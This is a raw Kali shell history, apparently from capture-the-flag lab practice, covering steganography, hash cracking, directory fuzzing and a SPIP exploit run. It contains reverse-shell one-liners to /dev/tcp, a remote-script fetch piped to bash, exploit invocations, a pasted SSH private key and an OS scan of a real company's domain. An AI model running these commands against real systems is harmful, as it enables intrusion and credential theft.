@@ -1,0 +1,548 @@
+    1  steghide 
+    2  sudo apt install stegide
+    3  sudo apt update
+    4  sudo apt install steghide
+    5  steghide stegosteg_1559008553457.jpg
+    6  steghide extract -sf stegosteg_1559008553457.jpg
+    7  cat steganopayload2248.txt
+    8  exit
+    9  cat meme_1559010886025.jpg
+   10  strings meme.jpg
+   11  strings meme_1559010886025.jpg
+   12  shutdown now
+   13  apt -y install seclists
+   14  cd /usr/share/wordlists
+   15  ls
+   16  git clone https://github.com/danielmiessler/SecLists.git\n
+   17  sudo git clone https://github.com/danielmiessler/SecLists.git\n
+   18  ls
+   19  shutdown now
+   20  sudo apt-get install hashcat
+   21  hashid '30dfb5af664714607f40f36dba23d976f6e73600'
+   22  unzip /usr/share/wordlists/rockyou.txt.gz
+   23  cd /usr/share/wordlists
+   24  ls
+   25  hashcat -m 100 30dfb5af664714607f40f36dba23d976f6e73600 -a 0 /usr/share/wordlists/rockyou.txt.gz
+   26  echo '30dfb5af664714607f40f36dba23d976f6e73600' > hashfile.txt
+   27  sudo echo '30dfb5af664714607f40f36dba23d976f6e73600' > hashfile.txt
+   28  sudo echo '30dfb5af664714607f40f36dba23d976f6e73600' > haile.txt
+   29  sudo su
+   30  hashcat -m 100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt.gz
+   31  hashcat -m 100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt.gz > text.txt
+   32  sudo hashcat -m 100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt.gz > text.txt
+   33  hashcat -m 0 hash.txt -a 0 /usr/share/wordlists/rockyou.txt.gz > text.txt
+   34  hashcat -m 0 hash.txt -a 0 /usr/share/wordlists/rockyou.txt.gz 
+   35  hashcat -m 0 30dfb5af664714607f40f36dba23d976f6e73600 -a 0 /usr/share/wordlists/rockyou.txt.gz 
+   36  hashcat -m 0 30dfb5af664714607f40f36dba23d976f6e73600 /usr/share/wordlists/rockyou.txt.gz 
+   37  gunzip /usr/share/wordlists/rockyou.txt.gz\n
+   38  sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n
+   39  ls
+   40  hashcat -m 0 30dfb5af664714607f40f36dba23d976f6e73600 -a 0 /usr/share/wordlists/rockyou.txt
+   41  hashcat -m 100 30dfb5af664714607f40f36dba23d976f6e73600 -a 0 /usr/share/wordlists/rockyou.txt
+   42  hashcat -m 0 30dfb5af664714607f40f36dba23d976f6e73600 -a 0 /usr/share/wordlists/rockyou.txt
+   43  sudo apt-get install john
+   44  cd /`
+   45  cd /~
+   46  cd ~/
+   47  la
+   48  cd Desktop
+   49  ls
+   50  echo '30dfb5af664714607f40f36dba23d976f6e73600'>hash.txt
+   51  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n
+   52  john --status
+   53  cd /usr/share/wordlists
+   54  ls
+   55  cd  /home/kali/.john\n
+   56  ls
+   57  john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali
+   58  john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Desktop/hash.txt
+   59  john --status
+   60  john --show hash.txt\n
+   61  john --session=mySession --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n
+   62  cd /home/kali/Desktop
+   63  john --session=mySession --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n
+   64  john --status=mySession
+   65  john --restore=mySession\n
+   66  john --show hash.txt\n
+   67  john --session=mySession --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n
+   68  john --restore=Mysession
+   69  cat mySession.log
+   70  rm mySession.log
+   71  rm hash.txt
+   72  cleaar
+   73  shutdown now
+   74  gobuster dir -u http://10.10.134.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n
+   75  gobuster dir -u http://10.10.134.7/ -w /usr/share/wordlists/dirb/common.txt
+   76  gobuster dir -u http://10.10.134.7/ -w /usr/share/wordlists/dirb/common.txt --timeout 5s -t
+   77  gobuster dir -u http://10.10.134.7/ -w /usr/share/wordlists/dirb/common.txt --timeout 5s -t 50
+   78  gobuster dir -u http://10.10.134.7/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --timeout 5s -t 50
+   79  ping 10.10.134.7
+   80  nmap -p 21,22,23,25,53,69,110,143,443,990,989,2121 -T4 -A -sC -sV 10.10.253.229\n
+   81  nmap -p 21,22,23,25,53,69,110,143,443,990,989,2121 -T4 -A -sC -sV 10.10.134.7\n
+   82  nmap 10.10.134.7\n
+   83  gobuster dir -u http://10.10.134.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+   84  ffuf -u http://10.10.134.7/?FUZZ=parameter -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt\n\n
+   85  ifconfig
+   86  ping 10.10.134.7
+   87  exit
+   88  sudo openvpn THMVPN.ovpn
+   89  exit
+   90  msfconsole
+   91  shutdown now
+   92  cd /usr/share/wordlists
+   93  sudo apt install seclists
+   94  ls
+   95  cd /
+   96  mkdir pracitce
+   97  sudo mkdir pracitc
+   98  ls
+   99  cd /pracitc
+  100  nano pay.py
+  101  ls
+  102  mousepad pay.py
+  103  close
+  104  ls
+  105  nano pay.py
+  106  rm id_rsa
+  107  exit
+  108  curl -I http://10.10.120.105/spip.php?page=spip_pass\n
+  109  curl -I http://10.10.120.105/spip.php
+  110  curl -I http://10.10.120.105
+  111  dirsearch -u http://10.10.120.105 -e php,html,txt\n
+  112  nmap -p 21,22,23,25,53,69,110,143,443,990,989,2121 -T4 -A -sC -sV 10.10120.105
+  113  nmap -p 21,22,23,25,53,69,110,143,443,990,989,2121 -T4 -A -sC -sV 10.10.120.105
+  114  nmap -p 21,22,23,25,53,69,110,143,443,990,989,2121 -T4 -A -sC -sV -Pn 10.10.120.105
+  115  nmap -p 21,22,23,25,53,69,80,110,143,443,990,989,2121 -T4 -A -sC -sV -Pn 10.10.120.105
+  116  ifconfig
+  117  nc -lvnp 4444
+  118  exit
+  119  nc -nlvp 4333 > id_rsa
+  120  ifconfig
+  121  nc -lvnp 1234
+  122  echo 'a\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n'> id_rsa
+  123  nano id_rsa
+  124  chmod 600 id_rsa
+  125  ssh -i id_rsa think@10.10.120.50
+  126  ssh -i id_rsa think@10.10.120.105
+  127  echo cat id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK\nuIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+9/2ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc\nOY8+1CUVX67y4UXrKASf8l7lPKIED24bXjkDBkVrCMHwScQbg/nIIFxyi262JoJTjh9Jgx\nSBjaDOELBBxydv78YMN9dyafImAXYX96H5k+8vC8/I3bkwiCnhuKKJ11TV4b8lMsbrgqbY\nRYfbCJapB27zJ24a1aR5Un+Ec2XV2fawhmftS05b10M0QAnDEu7SGXG9mF/hLJyheRe8lv\n+rk5EkZNgh14YpXG/E9yIbxB9Rf5k0ekxodZjVV06iqIHBomcQrKotV5nXBRPgVeH71JgV\nQFkNQyqVM4wf6oODSqQsuIvnkB5l9e095sJDwz1pj/aTL3Z6Z28KgPKCjOELvkAPcncuMQ\nTu+z6QVUr0cCjgSRhw4Gy/bfJ4lLyX/bciL5QoydAAAFiD95i1o/eYtaAAAAB3NzaC1yc2\nEAAAGBAMT73PaYo6VCQOKJcr5FtK8mAEgaXZgWrDhJbOjkcOxTIIz1vOrQyriF8mZ3gSFG\nqyYmYfFcxapikWHIqA8JSc6vvf9oqUB01czY8cYNfMFrxdFpytpSOU0O0F3DmPPtQlFV+u\n8uFF6ygEn/Je5TyiBA9uG145AwZFawjB8EnEG4P5yCBccotutiaCU44fSYMUgY2gzhCwQc\ncnb+/GDDfXcmnyJgF2F/eh+ZPvLwvPyN25MIgp4biiiddU1eG/JTLG64Km2EWH2wiWqQdu\n8yduGtWkeVJ/hHNl1dn2sIZn7UtOW9dDNEAJwxLu0hlxvZhf4SycoXkXvJb/q5ORJGTYId\neGKVxvxPciG8QfUX+ZNHpMaHWY1VdOoqiBwaJnEKyqLVeZ1wUT4FXh+9SYFUBZDUMqlTOM\nH+qDg0qkLLiL55AeZfXtPebCQ8M9aY/2ky92emdvCoDygozhC75AD3J3LjEE7vs+kFVK9H\nAo4EkYcOBsv23yeJS8l/23Ii+UKMnQAAAAMBAAEAAAGBAIIasGkXjA6c4eo+SlEuDRcaDF\nmTQHoxj3Jl3M8+Au+0P+2aaTrWyO5zWhUfnWRzHpvGAi6+zbep/sgNFiNIST2AigdmA1QV\nVxlDuPzM77d5DWExdNAaOsqQnEMx65ZBAOpj1aegUcfyMhWttknhgcEn52hREIqty7gOR5\n49F0+4+BrRLivK0nZJuuvK1EMPOo2aDHsxMGt4tomuBNeMhxPpqHW17ftxjSHNv+wJ4WkV\n8Q7+MfdnzSriRRXisKavE6MPzYHJtMEuDUJDUtIpXVx2rl/L3DBs1GGES1Qq5vWwNGOkLR\nzz2F+3dNNzK6d0e18ciUXF0qZxFzF+hqwxi6jCASFg6A0YjcozKl1WdkUtqqw+Mf15q+KW\nxlkL1XnW4/jPt3tb4A9UsW/ayOLCGrlvMwlonGq+s+0nswZNAIDvKKIzzbqvBKZMfVZl4Q\nUafNbJoLlXm+4lshdBSRVHPe81IYS8C+1foyX+f1HRkodpkGE0/4/StcGv4XiRBFG1qQAA\nAMEAsFmX8iE4UuNEmz467uDcvLP53P9E2nwjYf65U4ArSijnPY0GRIu8ZQkyxKb4V5569l\nDbOLhbfRF/KTRO7nWKqo4UUoYvlRg4MuCwiNsOTWbcNqkPWllD0dGO7IbDJ1uCJqNjV+OE\n56P0Z/HAQfZovFlzgC4xwwW8Mm698H/wss8Lt9wsZq4hMFxmZCdOuZOlYlMsGJgtekVDGL\nIHjNxGd46wo37cKT9jb27OsONG7BIq7iTee5T59xupekynvIqbAAAAwQDnTuHO27B1PRiV\nThENf8Iz+Y8LFcK
+  128  clear
+  129  nano id_rsa
+  130  cat id_rsa
+  131  ssh -i id_rsa think@10.10.120.105
+  132  chmod 600 id_rsa
+  133  rm id_rsa
+  134  exit
+  135  cd /home/kali/Desktop
+  136  nano id_rsa
+  137  chmod 6000 id_rsa
+  138  cd /home/kali
+  139  ls -la
+  140  cd .ssh
+  141  la -la
+  142  ls -la
+  143  cd ~/
+  144  nc -lvnp 4333 > id_rsa
+  145  ssh-keygen -t rsa -b 4096 
+  146  cd .ssh
+  147  ls -la
+  148  cat id_rsa.pub
+  149  ls
+  150  mousepad authorized_keys
+  151  ssh think@10.10.120.105
+  152  ssh think@10.10.120.105 -i authorized_keys
+  153  chmod 600 authorized_keys
+  154  ssh think@10.10.120.105 -i authorized_keys
+  155  nano id_rsa
+  156  echo '-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----' >id_rsa
+  157  cat id_rsa
+  158  chmod 600 id_rsa
+  159  ssh think@10.10.120.105 -i id_rsa
+  160  exit
+  161  nc -lvnp 3434
+  162  clear
+  163  exit
+  164  cat pay.py
+  165  python pay.py -h
+  166  python pay.py -u http://10.10.120.105/ python pay.py -c 'import os; os.system(\"bash -i >& /dev/tcp/<your_IP>/<your_port> 0>&1\")
+  167  python pay.py -u http://10.10.120.105/ python pay.py -c 'import os; os.system(\"bash -i >& /dev/tcp/10.17.3.50/1234 0>&1\")\n
+  168  python pay.py -u http://10.10.120.105/ python pay.py -c 'import os; os.system(\"bash -i >& /dev/tcp/10.17.3.50/1234 0>&1\")' -v\n
+  169  nano pay.py
+  170  cat pay.py
+  171  python pay.py -u http://10.10.120.105/ python pay.py -c 'import os; os.system(\"bash -i >& /dev/tcp/10.17.3.50/1234 0>&1\")' -v\n
+  172  nano pay.py
+  173  nano CVE-2023-27372.py
+  174  cat CVE-2023-27372.py
+  175  python3 CVE-2023-27372.py -u http://10.10.120.105/ -c "bash -i >& /dev/tcp/10.17.3.50/1234 0>&1"\n
+  176  python3 CVE-2023-27372.py -u http://10.10.120.105/ -c "bash -i >& /dev/tcp/10.17.3.50/1234 0>&1" -v\n
+  177  nano rev.sh
+  178  cat rev.sh
+  179  python pay.py -u http://10.10.120.105/ -c 'crul http://10.30.53.67/rev.sh | bash' -v
+  180  python pay.py -u http://10.10.120.105/ -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNy4zLjUwLzEyMzQgMD4mMSAg | base64 -d' -v
+  181  python pay.py -u http://10.10.120.105/ -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNy4zLjUwLzEyMzQgMD4mMSAg | base64 -d |bash' -v
+  182  python pay.py -u http://10.10.120.105/spip/ -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNy4zLjUwLzEyMzQgMD4mMSAg | base64 -d |bash' -v
+  183  python pay.py -u http://10.10.120.105/spip/ -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNy4zLjUwLzM0MzQgMD4mMSAg | base64 -d |bash' -v
+  184  clear
+  185  exit
+  186  gobuster dir -u http://10.10.39.78/ -w /usr/share/wordlists/seclists/Discovery/File-System/OBEX_common.txt
+  187  gobuster dir -u http://10.10.39.78/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+  188  ffuf -u http://10.10.39.78/?FUZZ=parameter -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt\n\n
+  189  ffuf -u http://10.10.39.78/?FUZZ=parameter -w /usr/share/wordlists/dirb/small.txt\n
+  190  dirsearch -u http://10.10.39.78 -e php,html,txt\n
+  191  \nffuf -u http://10.10.39.78/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt\n
+  192  python ppy.py -h
+  193  nano id_rsa
+  194  sudo nano id_rsa
+  195  cat id_rsa
+  196  ssh think@10.10.120.105 -i id_rsa
+  197  ssh think@10.10.39.78 -i id_rsa
+  198  ffuf -u http://10.10.1.24/?FUZZ=parameter -w /usr/share/wordlists/dirb/small.txt\n
+  199  gobuster dir -u http://10.10.39.78/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+  200  gobuster dir -u http://10.10.39.78/ -w /usr/share/wordlists/seclists/Discovery/File-System/OBEX_common.txt
+  201  ffuf -u http://10.10.1.24/?FUZZ=parameter -w /usr/share/wordlists/seclists/Fuzzing\n
+  202  ffuf -u http://10.10.1.24/?FUZZ=parameter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+  203  gobuster dir -u http://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions-big.txt -t 50 -x php,html,txt
+  204  gobuster dir -u http://10.10.1.24 -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-extensions-big.txt -t 50 -x php,html,txt
+  205  gobuster dir -u http://10.10.1.24 -w /usr/share/wordlists/seclists/Discovery/Web-Content/web-all-content-types.txt -t 50 -x php,html,txt
+  206  sudo openvpn THMVPN.ovpn
+  207  exit
+  208  python 49719.py -h
+  209  python 49719.py
+  210  shutdown now
+  211  firefox
+  212  clear
+  213  exit
+  214  nmap -h
+  215  wireshark -h
+  216  wireshark
+  217  exit
+  218  shutdown now
+  219  shutdown now
+  220  exit
+  221  ls
+  222  php remot.php -h
+  223  ifconfig
+  224  exit
+  225  cp remot.php /pracitc
+  226  sudo cp remot.php /pracitc
+  227  cd /pracitc
+  228  ls
+  229  sudo nano remot.php
+  230  ls
+  231  cat remot.php
+  232  sudo nano remot.php
+  233  exit
+  234  cd /pracitc
+  235  nano reverse.py
+  236  sudo nano reverse.py
+  237  exit
+  238  ifconfig
+  239  exit
+  240  firefox google.com
+  241  shutdown now
+  242  whoami
+  243  pwd
+  244  ls
+  245  msfconsole
+  246  nmap -O
+  247  nmap -O paytm.com
+  248  nmap --script -vulners
+  249  exit
+  250  ping 10.10.213.19
+  251  nmap 10.10.213.19
+  252  ping 10.10.43.152
+  253  ls -la
+  254  file webapp.db
+  255  ls -l
+  256  sqlite3 webapp.db
+  257  ls -l
+  258  file webapp.db
+  259  sqlite3 webapp.db
+  260  cleat
+  261  clear
+  262  sqlite3 webapp.db
+  263  ls -l
+  264  sudo su
+  265  mousepad pentest_setup.sh
+  266  ./pentest_setup.sh
+  267  sudo ./pentest_setup.sh
+  268  ls
+  269  sudo su
+  270  chmod +x ~/pentest-setup.sh\n
+  271  chmod +x pentest-setup.sh\n
+  272  chmod +x pentest_setup.sh
+  273  ^[[200~echo "alias pentest='$HOME/pentest-setup.sh --menu'" >> ~/.bashrc
+  274  source ~/.bashrc
+  275  exit
+  276  echo "alias pentest='pentest-setup.sh --menu'" >> ~/.bashrc\nsource ~/.bashrc\n
+  277  exit
+  278  echo "alias pentest='$HOME/pentest-setup.sh --menu'" >> ~/.bashrc\nsource ~/.bashrc\n
+  279  exit
+  280  ^[[200~./pentest-setup.sh
+  281  ./pentest-setup.sh
+  282  echo "alias pentest='$HOME/pentest_setup.sh --menu'" >> ~/.bashrc\nsource ~/.bashrc\n
+  283  exit
+  284  nano ~/pentest-setup.sh\n
+  285  chmod +x ~/pentest-setup.sh\n
+  286  echo "alias pentest='$HOME/pentest-setup.sh --menu'" >> ~/.bashrc\nsource ~/.bashrc\n
+  287  ./pentest-setup.sh\n
+  288  exit
+  289  ./pentest_setup.sh
+  290  pentest
+  291  sudo pentest
+  292  pentest
+  293  nano ~/pentest-setup.sh\n
+  294  ./pentest_setup.sh
+  295  mousepad pentest-framework.sh
+  296  chmod +x pentest-framework.sh
+  297  sudo mv pentest-framework.sh /usr/local/bin/pentest
+  298  pentest
+  299  sudo pentest
+  300  # To install all the tools\npentest --install
+  301  sudo mousepad /usr/local/bin/pentest
+  302  pentest
+  303  pentest menu
+  304  pentest --menu
+  305  sudo mousepad /usr/local/bin/pentest
+  306  pentest --menu
+  307  pentest
+  308  pentest --setup
+  309  pentest --install
+  310  pentest --menu
+  311  apt list --installed\n
+  312  echo "# Instant_Setup" >> README.md\ngit init\ngit add README.md\ngit commit -m "first commit"\ngit branch -M main\ngit remote add origin https://github.com/sankalpvb/Instant_Setup.git\ngit push -u origin main
+  313  git
+  314  git remote add origin https://github.com/sankalpvb/Instant_Setup.git\ngit branch -M main\ngit push -u origin main
+  315  git config --global user.name "sankalpvb"\ngit config --global user.email "sankalpbhosle9552@gmail.com"
+  316  git add .
+  317  git commit -m"add setup"
+  318  git push -u origin main
+  319  git clone [https://github.com/sankalpvb/Instant_Setup.git](https://github.com/sankalpvb/Instant_Setup.git)\ncd Instant_Setup
+  320  git clone [https://github.com/sankalpvb/Instant_Setup.git]
+  321  git clone https://github.com/sankalpvb/Instant_Setup.git
+  322  ls
+  323  git clone https://github.com/sankalpvb/Instant_Setup.git\ncd Instant_Setup
+  324  ls
+  325  chmod +x setup.sh
+  326  ./setup.sh
+  327  mousepad setup.sh
+  328  sudo apt install kali-wallpapers-2025
+  329  sudo apt install kali-wallpapers-2024
+  330  sudo apt install kali-wallpapers-2023
+  331  mousepad schemas.py
+  332  sudo apt install openvpn
+  333  ping 10.201.45.126
+  334  nmap 10.201.45.126
+  335  mkdir -p reconmaster/{app/{core,db,api,services},static/{css,js,img},templates,scripts} \\n&& touch reconmaster/{.gitignore,README.md,requirements.txt,.env} \\n&& touch reconmaster/app/{__init__.py,main.py} \\n&& touch reconmaster/app/core/{__init__.py,config.py} \\n&& touch reconmaster/app/db/{__init__.py,database.py,models.py,tools.db} \\n&& touch reconmaster/app/api/{__init__.py,routes.py} \\n&& touch reconmaster/app/services/{__init__.py,executor.py} \\n&& touch reconmaster/static/css/style.css \\n&& touch reconmaster/static/js/main.js \\n&& touch reconmaster/templates/index.html \\n&& touch reconmaster/scripts/populate_db.py\n
+  336  cd reconmaster
+  337  python3 -m venv venv\nsource venv/bin/activate
+  338  sudo apt update\nsudo apt install python3.11-venv\n
+  339  nano requirements.txt
